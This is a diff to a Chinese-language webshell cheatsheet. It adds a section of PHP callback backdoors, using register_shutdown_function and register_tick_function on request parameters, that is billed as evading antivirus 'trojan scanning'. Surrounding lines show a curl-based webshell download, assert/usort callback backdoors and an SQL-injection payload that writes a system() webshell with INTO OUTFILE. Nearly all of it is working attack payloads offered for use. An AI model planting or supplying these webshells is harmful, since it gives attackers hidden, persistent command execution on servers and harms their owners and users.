@@ -12,6 +12,7 @@
 *  [Webshell cheatsheet](#webshell-cheatsheet)  
 *  [Bypass blacklist extension](#bypass-blacklist-extension)  
 *  [SQL inj to webshell](#sql-inj-to-webshell)  
+*  [Don't delete my webshell](#dont-delete-my-webshell)
 *  [Reference](#reference)
 
 # How works
@@ -61,7 +62,7 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 <?php shell_exec('curl -o 1.php url');    // 預設下載index.html
 
 // 思路：延伸數組＋回調函數 php 5.4以後的特性
-// 回調後門  
+// 回調後門 多可以避免木馬查殺  
 // 參考下方reference
 ?1[]=blah&1[]=system();&2=assert
 param=usort(...$_GET);
@@ -100,9 +101,25 @@ E.G.
 union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
 ```
 
+# Dont delete my webshell
+筆記一些好用的木馬免殺  
+```php
+<?php
+$e = $_REQUEST['e'];
+register_shutdown_function($e, $_REQUEST['pass']);
+// 結束時callback
+// ?e=assert&pass=phpinfo();
+
+<?php
+$e = $_REQUEST['e'];
+declare(ticks=1);
+register_tick_function ($e, $_REQUEST['pass']);
+```
+
 ### Reference  
 * [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
 * [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
 * [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
 * [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
 * [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
+* [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)
